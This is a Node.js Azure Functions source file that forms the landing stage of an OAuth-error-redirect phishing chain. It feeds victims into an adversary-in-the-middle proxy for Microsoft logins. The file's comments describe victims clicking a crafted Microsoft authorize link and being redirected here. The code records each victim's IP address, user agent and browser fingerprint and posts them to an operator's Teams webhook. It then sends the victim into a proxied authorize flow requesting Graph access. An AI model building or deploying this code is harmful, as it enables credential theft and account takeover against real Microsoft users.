/**
 * OAuth Redirect Landing + Fingerprint Collection
 *
 * This is the entry point for the OAuth error redirect chain:
 *   1. Victim clicks phishing link on login.microsoftonline.com (thanks microsoft!)
 *   2. OAuth flow errors (invalid scope) -> Microsoft redirects to this endpoint
 *   3. We strip the error params, collect fingerprints, and transition to the AiTM proxy
 * 
 * Other than the initial entry point through oauth error redirects, the functionality
 * remains largely the same as the original AiTM proxy setup.
 *
 * The registered redirect_uri in Azure AD points here:
 *   https://<func>.azurewebsites.net/login
 *
 * Ideally, users will land on the AiTM proxy from an OAuth redirect, but they could also land here directly.
 *   - Example: https://login.microsoftonline.com/common/oauth2/v2.0/authorize?response_type=code&client_id=6f990075-91bb-4bda-908b-d65f8291eb60&prompt=none&scope=x&state=x
 *
 */

const { app } = require("@azure/functions");

const teams_webhook_url = process.env.TEAMS_WEBHOOK_URI;

// card dispatcher for teams notifications
async function dispatchMessage(context, message) {
  context.log(message);
  if (!teams_webhook_url) return;

  const plainText = message
    .replace(/<br>/gi, "\n")
    .replace(/<b>/gi, "**")
    .replace(/<\/b>/gi, "**")
    .replace(/<code>/gi, "`")
    .replace(/<\/code>/gi, "`")
    .replace(/<[^>]*>/g, "");

  const payload = {
    type: "message",
    attachments: [{
      contentType: "application/vnd.microsoft.card.adaptive",
      content: {
        "$schema": "http://adaptivecards.io/schemas/adaptive-card.json",
        type: "AdaptiveCard",
        version: "1.4",
        body: [{ type: "TextBlock", text: plainText, wrap: true }],
      },
    }],
  };

  try {
    let resp = await fetch(teams_webhook_url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });
    if (!resp.ok) {
      await fetch(teams_webhook_url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ text: message }),
      });
    }
  } catch (err) {
    context.log(`Webhook error: ${err.message}`);
  }
}


// GET /login — AiTM proxy entry point
app.http("direct_login", {
  methods: ["GET"],
  authLevel: "anonymous",
  route: "login",
  handler: async (req, context) => {
    const ip = req.headers.get("x-forwarded-for") || "unknown";
    const ua = req.headers.get("user-agent") || "unknown";
    const url = new URL(req.url);

    context.log("=== USER LANDED ON LOGIN ===");
    context.log("IP:", ip);
    context.log("UA:", ua);

    await dispatchMessage(context,
      `<b>Direct Login Entry</b><br>` +
      `<b>IP:</b> ${ip}<br>` +
      `<b>UA:</b> ${ua}`
    );

    // Redirect directly into the proxy's authorize flow
    const proxyLoginPath = "/common/oauth2/v2.0/authorize?" + new URLSearchParams({
      response_type: "code",
      client_id: "1fec8e78-bce4-4aaf-ab1b-5451cc387264",
      scope: "openid profile offline_access https://graph.microsoft.com/.default",
      redirect_uri: "https://login.microsoftonline.com/common/oauth2/nativeclient",
      state: "x",
    }).toString();

    return new Response(null, {
      status: 302,
      headers: {
        "Location": proxyLoginPath,
        "Cache-Control": "no-cache, no-store, must-revalidate",
      },
    });
  },
});

// POST /collect — Browser fingerprint sink
app.http("collect", {
  methods: ["POST"],
  authLevel: "anonymous",
  route: "collect",
  handler: async (req, context) => {
    const body = await req.text();
    context.log("=== FINGERPRINT INFO ===", body);

    try {
      const fp = JSON.parse(body);
      await dispatchMessage(context,
        `<b>Browser Fingerprint</b><br>` +
        `<b>Screen:</b> ${fp.scr || "?"}<br>` +
        `<b>TZ:</b> ${fp.tz || "?"}<br>` +
        `<b>GPU:</b> ${fp.gpu || "?"}<br>` +
        `<b>Platform:</b> ${fp.plat || "?"}<br>` +
        `<b>Cores:</b> ${fp.cores || "?"}`
      );
    } catch (e) {
      // Log raw if not valid JSON
    }

    return { status: 200, headers: { "Content-Type": "application/json" }, body: '{"ok":true}' };
  },
});
